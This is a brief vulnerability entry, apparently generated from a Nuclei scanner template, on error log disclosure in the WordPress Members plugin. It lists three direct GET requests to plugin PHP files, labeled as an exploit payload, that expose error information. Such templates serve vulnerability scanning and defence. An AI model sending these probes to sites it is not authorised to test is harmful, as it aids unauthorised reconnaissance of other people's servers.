# Vulnerability: WordPress Members / Membership & User Role Editor Plugin - Error Log Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-members-error-log-disclosure.yaml`)

## Description
WordPress Members plugin is vulnerable to error log disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/members/admin/class-role-edit.php
GET {{BaseURL}}/wp-content/plugins/members/admin/class-role-new.php
GET {{BaseURL}}/wp-content/plugins/members/inc/class-role.php
```

